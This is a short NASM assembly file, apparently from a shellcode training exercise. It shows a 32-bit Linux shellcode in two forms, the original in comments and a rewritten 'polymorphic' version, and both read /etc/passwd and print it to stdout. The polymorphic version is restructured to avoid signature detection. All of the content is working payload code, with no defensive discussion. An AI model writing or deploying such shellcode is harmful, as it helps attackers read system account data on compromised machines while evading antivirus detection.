; Filename:	polymorph_3.nasm
; Author:	Jules Adriaens
; Assemble:	nasm -f elf32 -o polymorph_3.o polymorph_3.nasm
; Link:		ld -o polymorph_3 polymorph_3.o

global _start

section .text
_start:

; original instructions:
;	xor  ecx, ecx
;	xor  eax, eax
;	xor  edx, edx
;	push ecx
;	mov  al, 0x5
;	push 0x64777373
;	push 0x61702f63
;	push 0x74652f2f
;	mov  ebx, esp
;	int  0x80

;	mov  ecx, ebx
;	mov  ebx, eax
;	mov  al, 0x3
;	mov  dx, 0xfff
;	inc  dx
;	int  0x80

;	xor  eax, eax
;	xor  ebx, ebx
;	mov  bl, 0x1
;	mov  al, 0x4
;	int  0x80

;	xor  eax, eax
;	mov  al, 0x1
;	int  0x80


; polymorphed instructions:
	push byte 0x5
	pop  eax
	xor  ecx, ecx
	push ecx
	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	mov  ebx, esp
	int  0x80

	mov  ecx, ebx
	mov  ebx, eax
	mov  al, 0x3
	mov  dx, 0xfff
	inc  dx
	int  0x80

	push byte 0x1
	push byte 0x4
	pop  eax
	pop  ebx
	int  0x80

	mov  eax, ebx
	int  0x80
